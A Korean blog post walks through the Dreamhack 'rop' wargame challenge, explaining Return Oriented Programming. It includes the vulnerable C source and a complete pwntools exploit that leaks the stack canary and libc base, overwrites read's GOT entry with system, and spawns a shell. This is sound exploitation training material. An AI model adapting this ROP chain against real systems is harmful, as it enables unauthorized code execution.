---
layout: post
titile: Return Oriented Programming
categories: pwn
use_math: false
---

## 01. ROP (Return Oriented Programming)란?

ROP란 Return Oriented Programming의 약자로 다수의 리턴 가젯을 연결해 NX, ASLR 등의 보호기법을 우회하는 기법을 말한다. 이번 글에서는 드림핵의 [rop](https://dreamhack.io/wargame/challenges/354/) 문제를 정리하면서 rop 개념에 대해 확실히 이해하고자 한다.

<br>

## 02. Attack

### 02.1 분석

#### 보호 기법 파악
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/0c960a26-dbe6-47c9-85df-b3839be09ba7)


checksec 명령어를 통해 파일의 보호기법을 파악할 수 있다. 위 예제에서는 스택 카나리와 NX 기법이 적용되어 있는 것을 확인할 수 있다. ASLR은 표시되어 있지 않다면 기본적으로 적용되어 있다.

<br>

#### 코드 분석

```c
// Name: rop.c
// Compile: gcc -o rop rop.c -fno-PIE -no-pie

#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Leak canary
  puts("[1] Leak Canary");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Do ROP
  puts("[2] Input ROP payload");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

read 함수에서 0x30크기의 buf에 0x100의 크기만큼 입력을 받고 있기 대문에 bof가 발생한다. 또한 입력된 buf를 출력까지 하고 있기 때문에 카나리 릭이 가능하다.

<br>

```c
// Leak canary
puts("[1] Leak Canary");
printf("Buf: ");
read(0, buf, 0x100);
printf("Buf: %s\n", buf);
```

두번째 read 함수 역시 bof가 발생한다. 여기서 rop를 이용해 공격을 수행할 수 있을 듯 하다.

<br>

```c
// Do ROP
puts("[2] Input ROP payload");
printf("Buf: ");
read(0, buf, 0x100);
```

<br>

#### 스택 파악

다음과 같은 스택을 그려볼 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/f9811e8c-e623-4dc5-ad8c-512e7f6f61cf)


> 코드만 보고 스택을 그릴 경우 가끔 더미값이 스택 중간이 끼어 있을 수 있어 틀리는 경우가 있다. 직접 디버깅을 하면서 스택을 그리는 것이 더욱 정확하다.

<br>

#### 공격 설계

먼저 카나리 값은 buf를 입력받고 출력하는 부분이 있기 때문에 buf를 canary 앞의 null값까지 다 채우면 카나리 값을 구할 수 있다.

다음으로는 system("/bin/sh") 함수를 실행시켜 쉘을 따내야 한다. 이를 위해서는 system 함수의 주소를 알아내야하고 "/bin/sh" 문자열이 필요하다.

system 함수의 주소는 ASLR 기법이 적용되어 있기 때문에 일반적인 방법으로는 주소를 알아낼 수 없다. 때문에 GOT table 에서의 read 함수의 주소를 출력해보고 libc에서의 read함수와 system함수간의 거리를 계산하여 system 함수의 주소를 구해야한다.

알아낸 system 함수를 실행시키기 위해서는 GOT Overwrite 방법을 이용하면 된다. GOT 테이블에서의 read함수의 주소를 system 함수의 주소로 변조하면 read 함수 실행 시 system 함수가 실행된다. 이 overwrite에는 read함수를 이용할 수 있다.

"/bin/sh" 문자열의 경우 GOT Overwrite 할 때 read 함수를 실행할 때 같이 입력해주면 된다.

<br>

### 02.2 카나리 릭

카나리 값은 buf를 입력받고 출력하는 부분이 있기 때문에 buf를 canary 앞의 null값까지 다 채우면 카나리 값을 구할 수 있다.

```python
from pwn import *
def slog(name, addr): return success(": ".join([name, hex(addr)]))

e = context.binary =  ELF("../exe/rop")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("../libc/libc-2.27.so")

# p = remote("host3.dreamhack.games", 17931)
p = e.process()

context.log_level = 'debug'
pause()

buf2canary = 0x38

# Leak canary
payload = b'A' * (buf2canary + 1)
p.sendafter("Buf: ", payload)
p.recvuntil(payload)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)
```

> 이 때 sendline의 경우 뒤에 "\\n"을 붙인다. read 함수로 입력을 받는 경우 send로 보내야 하고 scanf 함수는 "\\n"까지 입력값을 받기 때문에 sendline로 보내야한다고 한다.

<br>

### 02.3 system 함수 주소 알아내기

system 함수의 주소는 ASLR 기법이 적용되어 있기 때문에 일반적인 방법으로는 주소를 알아낼 수 없다. 때문에 GOT table 에서의 read 함수의 주소를 출력해보고 libc에서의 read함수와 system함수간의 거리를 계산하여 system 함수의 주소를 구해야한다.

<br>

#### rot 설계

puts 함수를 이용해 read 함수의 주소를 출력하려고 한다. 디버깅을 해보면 puts 함수는 edi 레지스터로 인자를 받고 출력하는 것을 알 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/7fd3e092-e828-4d76-aa83-6cd8b1b0eda1)


때문에 pop edi 또는 pop rdi 가젯의 주소를 찾아 ret address에 넣어주고 ret address 뒤에 GOT 테이블에서의 read 함수의 주소를 인자로 넣어주면 rdi에 read 함수의 주소가 들어가게 된다. 이후 puts 함수의 주소를 다음 값으로 넣어주게 되면 read 함수의 주소를 출력시킬 수 있다.

다음과 같은 스택을 그려볼 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/8aca1cd9-abef-4e78-b8f4-9d621db675ab)


<br>

#### 가젯 탐색

ROPgadget을 이용하여 리턴 가젯을 탐색할 수 있다.

```
ROPgadget --binary ./rop --re "pop rdi"
```

0x4007f3 위치에 pop rdi 가젯이 있는 것을 확인할 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/8e535288-4c63-4163-bda0-b1c5de5cfa6a)


<br>

#### 익스 짜기

따라서 다음 코드로 라이브러리에서의 read 함수의 주소를 출력시킬 수 있다.

```python
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
# ROPgadget --binary ../exe/rop --re "pop rdi"
pop_rdi = 0x00000000004007f3

payload = b"A"*buf2canary + p64(cnry) + b"B"*0x8

# puts(read_got) -> read 함수 출력
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00\x00") 
# \x00\x00을 더해주는 이유는 6바이트 크기의 함수 주소를 8바이트로 맞춰주는 것 같다.

# 다음 방법으로 system 주소를 구할 수 있다. (lib에서 함수끼리의 길이는 항상 같기 때문이다.)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]

slog("read", read)
slog("libc_base", lb)
slog("system", system)
```

> 이 때 주의할 점은 libc 버전에 따라 함수간의 간격이 다르기 때문에 로컬에서 작동하는 익스코드가 공격 서버에는 작동하지 않을 수 이다.

<br>

### 02.4 Got overwrite 및 "/bin/sh" 입력

알아낸 system 함수를 실행시키기 위해서는 GOT Overwrite 방법을 이용하면 된다. GOT 테이블에서의 read함수의 주소를 system 함수의 주소로 변조하면 read 함수 실행 시 system 함수가 실행된다. 이 overwrite에는 read함수를 이용할 수 있다. "/bin/sh" 문자열의 경우 GOT Overwrite 할 때 read 함수를 실행할 때 같이 입력해주면 된다.

<br>

#### rot 설계

read 함수가는 인자를 edx, rsi, edi 레지스터로 받는 것을 확인할 수 있다. read(int fd, void \*buf, size\_t nbytes)로 edx에 입력받는 크기, rsi에 입력하는 버퍼 edi에는 0을 입력하면 된다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/8ed69396-e9b6-4b38-9721-ee8ce5b95e5f)


read 함수가 실행되면 system 함수의 주소를 입력하면 성공적으로 GOT Overwrite를 수행할 수 있다.

이후 read함수를 호출하여 system 함수를 실행하면 된다. system("/bin/sh")을 실행시키기 위해서는 system 함수가 인자로 받는 rdi에 "/bin/sh" 문자열을 넣어주면 된다.

GOT Overwrite에서 입력받을 때 "/bin/sh"문자열을 같이 입력하고 pop rdi 가젯을 통해 rdi에 해당 문자열을 넣으면 된다.

다음과 같은 스택을 그려볼 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/60c6c73c-e7cc-49ad-8ded-15a6f7933d71)


<br>

#### 가젯 탐색

0x4007f3 위치에서 pop rdi 가젯을 0x4007f1 위치에서 pop rsi 가젯을 찾을 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/071ed221-904b-497f-acbf-0d968598824d)
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/c52d5a6c-1ff7-4d1a-93ba-422a1105a4a6)


바이너리에 pop edi 가젯은 존재하지 않는다. 하지만 이 예제에서는 read 함수의 GOT를 읽은 뒤 rdx 값이 매우 크게 설정되므로, rdx를 설정하는 가젯을 추가하지 않아도 됩니다

> 이는 실행환경마다 다르기 때문에 조심하자.

<br>

#### 익스 짜기

```python
#Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
# ROPgadget --binary ../exe/rop --re "pop rdi"
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1

payload = b"A"*buf2canary + p64(cnry) + b"B"*0x8

# puts(read_got) -> read 함수 주소 구하기
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)
 
# read(0, read_got, 0x10) -> got overwire
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00\x00") 
# \x00\x00을 더해주는 이유는 6바이트 크기의 함수 주소를 8바이트로 맞춰주는 것 같다.

# 다음 방법으로 system 주소를 구할 수 있다. (lib에서 함수끼리의 길이는 항상 같기 때문이다.)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]

slog("read", read)
slog("libc_base", lb)
slog("system", system)

p.send(p64(system)+b"/bin/sh\x00") # 뒤에 null값을 추가하여 system 함수에 인자를 넣을 때 딱 "/bin/sh" 문자열만 넣을 수 있다.
p.interactive()
```
<br>

### 02.5 최종 코드

```python
from pwn import *
def slog(name, addr): return success(": ".join([name, hex(addr)]))

e = context.binary =  ELF("../exe/rop")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("../libc/libc-2.27.so")

# p = remote("host3.dreamhack.games", 17931)
p = e.process()

context.log_level = 'debug'
pause()

buf2canary = 0x38

# Leak canary
payload = b'A' * (buf2canary + 1)
p.sendafter("Buf: ", payload)
p.recvuntil(payload)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)

#Exploit
read_plt = e.plt['read']
read_got = e.got['read']
puts_plt = e.plt['puts']
# ROPgadget --binary ../exe/rop --re "pop rdi"
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1

payload = b"A"*buf2canary + p64(cnry) + b"B"*0x8

# puts(read_got) -> read 함수 주소 구하기
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)
 
# read(0, read_got, 0x10) -> got overwire
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt)

# read("/bin/sh") = system("/bin/sh") 호출
payload += p64(pop_rdi)
payload += p64(read_got+0x8)
payload += p64(read_plt)

p.sendafter("Buf: ", payload)
read = u64(p.recvn(6)+b"\x00\x00") 
# \x00\x00을 더해주는 이유는 6바이트 크기의 함수 주소를 8바이트로 맞춰주는 것 같다.

# 다음 방법으로 system 주소를 구할 수 있다. (lib에서 함수끼리의 길이는 항상 같기 때문이다.)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]

slog("read", read)
slog("libc_base", lb)
slog("system", system)

p.send(p64(system)+b"/bin/sh\x00") # 뒤에 null값을 추가하여 system 함수에 인자를 넣을 때 딱 "/bin/sh" 문자열만 넣을 수 있다.
p.interactive()
```

<br>

### 02.6 디버깅

디버깅을 통해 확실히 gop 개념에 대해 이해하자.

main 함수의 ret 부분이다. 우리가 넣은 pop rdi 가젯으로 이동하는 것을 확인할 수 있다. 또한 스택에는 GOT 테이블에서의 read 함수의 주소가 있는 것을 확인할 수 있다. 이후 puts 함수가 실행되는 것 역시 확인할 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/f4d1d833-f56a-4497-9883-c61985eae496)


puts 함수 실행이 끝나면 system 함수의 주소가 구해진다. gdb에서 system 함수를 잘 구한 것을 확인할 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/963040f8-7eb2-4511-b227-b086ee5ab15c)
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/963d3b1d-61e5-48fc-9e31-660660e3421a)


다음 read 함수 호출 부분이다. pop rdi 가젯을 통해 rdi에 값 0을 pop rsi r15 가젯에서 rsi에 GOT 테이블에서의 read 함수의 주소가 잘 들어가는 것을 볼 수 있다. r15는 필요없기 때문에 그냥 0을 넣는 것을 확인할 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/2df863de-036c-45ef-8bb1-0f094ddb325c)


read 함수의 입력값은 다음 값이 된다.

```python
p.send(p64(system)+b"/bin/sh\x00")
```

GOT 테이블의 read 함수에 구한 system 주소가 들어간 것을 확인할 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/00df6f1d-91cd-4e82-9378-2381152374bd)


마지막으로 pop rdi 가젯에서 rdi에 "/bin/sh" 문자가 들어가고 system 함수가 실행되는 것을 확인할 수 있다.
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/0133a71f-e880-47bb-95d2-d57f049e3f33)


쉘이 성공적으로 실행이 된다!
![image](https://github.com/bshyuunn/bshyuunn.github.io/assets/87067974/f15f783e-b6fe-4d1d-a7ed-9feae3beb2a4)

<br>

> ## 03. Reference
> 
> -   [https://dreamhack.io/lecture/courses/84](https://dreamhack.io/lecture/courses/84)
